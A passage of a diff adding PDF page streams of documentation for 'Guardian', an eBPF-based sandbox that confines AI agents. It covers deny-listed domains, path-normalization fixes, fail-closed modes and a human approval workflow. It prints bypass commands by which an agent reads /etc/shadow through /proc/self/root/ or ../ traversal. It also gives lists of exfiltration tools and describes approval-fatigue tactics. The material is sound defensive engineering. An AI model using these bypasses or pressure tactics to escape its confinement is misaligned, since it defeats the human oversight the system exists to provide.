+(Step 3:  connect\(socket, {93.184.216.34, port 443}\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 131 Tm
+(         ?? Guardian tracepoint: evaluates network policy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 111 Tm
+(For domain-based blocking, the daemon resolves deny-listed domains at startup and) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 96 Tm
+(periodically refreshes:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 23 of 40) Tj
+ET
+endstream
+endobj
+27 0 obj
+<< /Length 3244 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 722 Tm
+(Config:  deny_domains = ["evil.com", "c2-server.net"]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 698 Tm
+(Startup: resolve evil.com ? 93.184.216.34) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 686 Tm
+(         resolve c2-server.net ? 10.20.30.40) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 662 Tm
+(BPF map: NET_DENY_IPV4[93.184.216.34] = 1) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 650 Tm
+(         NET_DENY_IPV4[10.20.30.40] = 1) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 626 Tm
+(Every 5 minutes: re-resolve domains \(IPs may change via DNS TTL\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 582 Tm
+(11. Path Canonicalization and Normalization) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 554 Tm
+(11.1 The /proc/self/root/ Bypass) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 531 Tm
+(Every Linux process has a virtual symlink at /proc/self/root/ that points to the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 516 Tm
+(process's root filesystem. An agent can use it to access any file:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 491 Tm
+(# /etc/shadow is denied) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 479 Tm
+(cat /etc/shadow              ? DENIED by Guardian) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 455 Tm
+(# But:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 443 Tm
+(cat /proc/self/root/etc/shadow   ? path doesn't match "/etc/shadow") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 431 Tm
+(                                  ? It matches "/proc/self/**" \(allowed!\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 419 Tm
+(                                  ? ALLOWED ? BYPASS!) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 399 Tm
+(11.2 The ../ Traversal Bypass) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 376 Tm
+(# /tmp/** is allowed, /etc/shadow is denied) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 364 Tm
+(cat /tmp/../etc/shadow) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 340 Tm
+(# Without normalization:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 328 Tm
+(#   Path = "/tmp/../etc/shadow") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 316 Tm
+(#   Does it match /tmp/**? YES \(it starts with /tmp/\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 304 Tm
+(#   Does it match /etc/shadow? NO \(it's /tmp/../etc/shadow\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 292 Tm
+(#   ? ALLOWED ? BYPASS!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 268 Tm
+(# With normalization:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 256 Tm
+(#   normalize_path\("/tmp/../etc/shadow"\) ? "/etc/shadow") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 244 Tm
+(#   Does it match /etc/shadow? YES) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 232 Tm
+(#   ? DENIED ?) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 212 Tm
+(11.3 normalize_path\(\) ? Userspace Quick Fix) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 189 Tm
+(Guardian's normalize_path\(\) function in config.rs handles these bypasses in userspace:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 164 Tm
+(pub fn normalize_path\(path: &str\) -> String {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 152 Tm
+(    let path = path.to_string\(\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 128 Tm
+(    // Step 1: Strip /proc/self/root/ prefix) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 116 Tm
+(    // "/proc/self/root/etc/shadow" ? "/etc/shadow") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 104 Tm
+(    if let Some\(rest\) = path.strip_prefix\("/proc/self/root/"\) {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 92 Tm
+(        return normalize_path\(&format!\("/{}", rest\)\); // recurse for further normalization) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 24 of 40) Tj
+ET
+endstream
+endobj
+28 0 obj
+<< /Length 3326 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(    }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(    // Step 2: Strip /proc/<pid>/root/ prefix) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(    // "/proc/1234/root/etc/shadow" ? "/etc/shadow") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(    // \(only if the segment after /proc/ is a numeric PID\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(    // Step 3: Resolve .. and . components) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(    // "/tmp/../etc/shadow" ? "/etc/shadow") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(    let mut components = Vec::new\(\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(    for component in path.split\('/'\) {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(        match component {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(            "" | "." => continue,       // skip empty and current-dir) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(            ".." => { components.pop\(\); } // go up one level) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 576 Tm
+(            other => components.push\(other\),) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(        }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 552 Tm
+(    }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 540 Tm
+(    format!\("/{}", components.join\("/"\)\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 528 Tm
+(}) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 508 Tm
+(Important limitation: normalize_path\(\) operates on strings, not the filesystem. It) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 493 Tm
+(cannot resolve symlinks. That is why Landlock \(inode-level\) is the primary defense for) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 478 Tm
+(cgroup agents.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 453 Tm
+(11.4 Path Truncation Safety) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 430 Tm
+(eBPF can only read 256 bytes of a filename \(MAX_FILENAME_LEN\). If a path is longer, it) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 415 Tm
+(gets truncated. This is dangerous because policy evaluation on a truncated path may) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 400 Tm
+(produce the wrong result.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 375 Tm
+(Guardian handles this with the EVENT_FLAG_TRUNCATED flag:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 350 Tm
+(Path: /very/long/.../path/to/etc/shadow \(> 256 bytes\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 338 Tm
+(Truncated in eBPF to: /very/long/.../path/to/etc/sha) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 314 Tm
+(Policy check on truncated path:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 302 Tm
+(  Does "/very/long/.../path/to/etc/sha" match deny list? NO) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 290 Tm
+(  ? Would be ALLOWED ? WRONG!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 266 Tm
+(With truncation detection:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 254 Tm
+(  filename_len >= MAX_FILENAME_LEN - 1 ? truncated!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 242 Tm
+(  Set EVENT_FLAG_TRUNCATED in status_flags) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 230 Tm
+(  evaluate_policy\(\) sees truncation flag ? return ACTION_DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 218 Tm
+(  ? DENIED \(fail-safe\) ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 192 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 174 Tm
+(12. Strict Enforcement Mode) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 146 Tm
+(12.1 Monitor vs Enforce vs Strict) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 123 Tm
+(Guardian has three operating modes:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 98 Tm
+(| Mode | LSM fails to load | Behavior | |------|--------------------|----------| |) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 25 of 40) Tj
+ET
+endstream
+endobj
+29 0 obj
+<< /Length 3626 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(monitor | N/A \(LSM not used\) | Log events only, never block anything | | enforce | Falls) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 717 Tm
+(back to monitor | Block what it can, log what it can't | | strict | Exits with error |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 702 Tm
+(Refuses to run without full enforcement |) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 677 Tm
+(12.2 Why Strict Mode Matters) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 654 Tm
+(In enforce mode, if the kernel does not support BPF LSM \(CONFIG_BPF_LSM is not set\),) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 639 Tm
+(Guardian silently degrades to monitor-only. The operator might not notice, thinking) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 624 Tm
+(enforcement is active when it is not.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 599 Tm
+(strict mode prevents this dangerous situation:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 574 Tm
+(match config.global.mode {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 562 Tm
+(    Mode::Strict => {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 550 Tm
+(        if !file_lsm_ok {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 538 Tm
+(            error!\("STRICT mode: LSM file_open failed to load."\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 526 Tm
+(            error!\("Cannot guarantee file access enforcement."\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 514 Tm
+(            error!\("Ensure CONFIG_BPF_LSM=y and 'bpf' is in the LSM list."\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 502 Tm
+(            std::process::exit\(1\);  // EXIT ? refuse to run unprotected) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 490 Tm
+(        }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 478 Tm
+(        if !exec_lsm_ok {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 466 Tm
+(            error!\("STRICT mode: LSM bprm_check_security failed."\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 454 Tm
+(            std::process::exit\(1\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 442 Tm
+(        }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 430 Tm
+(        // Check all other required hooks...) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 418 Tm
+(        info!\("STRICT mode: All hooks loaded. Full enforcement active."\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 406 Tm
+(    }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 394 Tm
+(    Mode::Enforce => {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 382 Tm
+(        // Log warnings but continue running) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 370 Tm
+(        if !file_lsm_ok {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 358 Tm
+(            warn!\("File enforcement unavailable. Monitor-only for file access."\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 346 Tm
+(        }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 334 Tm
+(    }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 322 Tm
+(    Mode::Monitor => { /* No enforcement at all */ }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 310 Tm
+(}) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 290 Tm
+(Use strict mode in production where you need guaranteed enforcement.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 259 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 241 Tm
+(13. Configurable Fail-Closed Mode) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 213 Tm
+(13.1 Fail-Open vs Fail-Closed) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 190 Tm
+(When an eBPF program encounters an error \(memory pressure, map lookup failure,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 175 Tm
+(unexpected state\), it must decide what to do. There are two options:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 150 Tm
+(- Fail-open \(default\): Return 0 ? allow the operation. Safe for system stability but) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 135 Tm
+(   the agent might slip through on errors.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 114 Tm
+(- Fail-closed: Return -EACCES ? deny the operation. Secure but might break the agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 99 Tm
+(   on transient errors.) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 26 of 40) Tj
+ET
+endstream
+endobj
+30 0 obj
+<< /Length 3533 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(Normal operation:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(  eBPF program runs ? evaluates policy ? allows or denies ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(Error condition \(e.g., can't read map\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(  Fail-open:  return 0 ? operation allowed \(might be a deny that slipped through\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(  Fail-closed: return -EACCES ? operation blocked \(secure, but agent might break\)) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 652 Tm
+(13.2 Per-Cgroup Fail-Closed via BPF Map) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 629 Tm
+(Guardian makes this configurable per-agent using a BPF map:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 604 Tm
+(// In eBPF program) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 592 Tm
+(#[map]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 580 Tm
+(static FAIL_CLOSED_CGROUPS: HashMap<u64, u8> = HashMap::with_max_entries\(1024, 0\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 556 Tm
+(#[lsm\(hook = "file_open"\)]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 544 Tm
+(pub fn guardian_enforce\(ctx: LsmContext\) -> i32 {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 532 Tm
+(    match try_guardian_enforce\(&ctx\) {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 520 Tm
+(        Ok\(ret\) => ret,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 508 Tm
+(        Err\(_\) => {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 496 Tm
+(            // Error occurred ? check fail mode for this cgroup) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 484 Tm
+(            let cgroup_id = unsafe { bpf_get_current_cgroup_id\(\) };) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 472 Tm
+(            if FAIL_CLOSED_CGROUPS.get\(&cgroup_id\).is_some\(\) {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 460 Tm
+(                -13  // EACCES ? deny on error \(fail-closed\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 448 Tm
+(            } else {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 436 Tm
+(                0    // allow on error \(fail-open\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 424 Tm
+(            }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 412 Tm
+(        }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 400 Tm
+(    }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 388 Tm
+(}) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 368 Tm
+(Configuration:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 343 Tm
+([[agents]]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 331 Tm
+(name = "high-security-agent") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 319 Tm
+(identity = "cgroup") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 307 Tm
+(fail_closed = true    # Deny on error ? maximum security) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 281 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 263 Tm
+(14. The Approval Workflow Security Model) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 235 Tm
+(Guardian includes a human-in-the-loop approval system for when agents need access to) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 220 Tm
+(resources not in their policy. This system itself must be hardened against manipulation.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 195 Tm
+(14.1 Permission Requests and Oneshot Channels) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 172 Tm
+(When an agent needs access to a resource it does not have permission for, it can request) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 157 Tm
+(approval:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 132 Tm
+(Agent Process                    Guardian Daemon                   Human Operator) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 120 Tm
+(     ?                                ?                                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 108 Tm
+(     ??? RequestPermission ????????????                                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 96 Tm
+(     ?   \(resource, justification\)    ?                                ?) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 27 of 40) Tj
+ET
+endstream
+endobj
+31 0 obj
+<< /Length 4370 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(     ?                                ??? Create oneshot channel       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(     ?                                ??? Rate limit check             ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(     ?                                ??? Risk classification          ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(     ?                                ??? Auto-deny check              ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(     ?                                ??? Broadcast to dashboard ???????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(     ?                                ?                                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(     ?   [Agent BLOCKS here]          ?            [Human reviews]     ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(     ?   waiting on oneshot::recv\(\)   ?                                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(     ?                                ?                                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(     ?                                ?????? Approve \(5 min grant\) ????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(     ?                                ?                                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(     ???? PermissionDecision ?????????                                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(     ?   \(approved=true, duration=300\)?                                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 576 Tm
+(     ?                                ?                                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(     ?                                ?                                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 552 Tm
+(   Proceeds with access          Creates temp grant          Continues work) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 532 Tm
+(A oneshot channel is a Rust concurrency primitive: a channel that sends exactly one) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 517 Tm
+(message. The agent blocks on recv\(\) until the human responds, without any polling or) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 502 Tm
+(busy-waiting.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 477 Tm
+(14.2 Risk Classification \(4-Tier Scoring\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 454 Tm
+(Every permission request is assigned a risk level based on what resource is being) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 439 Tm
+(requested:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 414 Tm
+(Risk Levels:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 402 Tm
+(  LOW      ? Score 0-25   ? 0s wait  ? e.g., /tmp/file.txt) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 390 Tm
+(  MEDIUM   ? Score 26-50  ? 3s wait  ? e.g., /var/cache/data) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 378 Tm
+(  HIGH     ? Score 51-75  ? 5s wait  ? e.g., /etc/passwd, /var/log/syslog) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 366 Tm
+(  CRITICAL ? Score 76-100 ? 10s wait ? e.g., /etc/shadow, /root/.ssh/id_rsa) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 354 Tm
+(                            + type-to-confirm required) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 334 Tm
+(How scoring works:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 309 Tm
+(Base score: 25 \(MEDIUM by default\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 285 Tm
+(Path pattern matching:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 273 Tm
+(  /etc/shadow     ? 90 \(CRITICAL pattern\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 261 Tm
+(  /etc/sudoers    ? 90 \(CRITICAL pattern\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 249 Tm
+(  /root/**        ? 90 \(CRITICAL pattern\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 237 Tm
+(  /etc/passwd     ? 60 \(HIGH pattern\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 225 Tm
+(  /var/log/**     ? 60 \(HIGH pattern\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 213 Tm
+(  /tmp/**         ? 10 \(LOW pattern\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 201 Tm
+(  /proc/self/**   ? 10 \(LOW pattern\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 177 Tm
+(Multipliers \(cumulative\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 165 Tm
+(  × 1.5  if request type is "exec" \(executing is riskier than reading\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 153 Tm
+(  × 2.0  if agent was previously denied \(post-denial repeat = suspicious\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 141 Tm
+(  × 1.3  if agent has high request rate \(>5 requests/hour\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 117 Tm
+(Known risky executables \(score ? 60 automatically\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 105 Tm
+(  /usr/bin/curl, /usr/bin/wget  ? data exfiltration tools) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 93 Tm
+(  /usr/bin/ssh                  ? remote access) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 28 of 40) Tj
+ET
+endstream
+endobj
+32 0 obj
+<< /Length 3602 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(  /usr/bin/rm, /usr/bin/dd      ? destructive tools) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(Example calculation:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(  Agent requests exec of /usr/bin/curl) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(  Base score: 60 \(known risky executable\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(  Exec multiplier: 60 × 1.5 = 90) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(  Score 90 ? CRITICAL risk level) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(  ? 10 second mandatory wait + type-to-confirm in dashboard) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 628 Tm
+(Why mandatory wait timers? They prevent "rubber-stamping" ? the habit of clicking) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 613 Tm
+("approve" reflexively without actually reading what is being requested. The timer forces) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 598 Tm
+(the human to pause and think.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 573 Tm
+(14.3 Rate Limiting and Exponential Backoff) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 550 Tm
+(Rate limiting prevents an agent from flooding the operator with requests \(approval) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 535 Tm
+(fatigue attack\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 510 Tm
+(Per-agent limits:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 498 Tm
+(  3 requests per minute \(sliding window\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 486 Tm
+(  15 requests per hour \(sliding window\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 462 Tm
+(Exponential backoff after denials:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 450 Tm
+(  1st denial: 30 second cooldown) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 438 Tm
+(  2nd denial: 60 second cooldown \(30 × 2^1\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 426 Tm
+(  3rd denial: 120 second cooldown \(30 × 2^2\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 414 Tm
+(  4th denial: 240 second cooldown \(30 × 2^3\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 402 Tm
+(  ...) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 390 Tm
+(  Max: 600 second cooldown \(10 minutes\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 366 Tm
+(Same-resource cooldown:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 354 Tm
+(  If /etc/shadow was denied, the agent cannot request it again for 5 minutes.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 342 Tm
+(  This prevents the agent from spamming the same request hoping the human gets tired.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 322 Tm
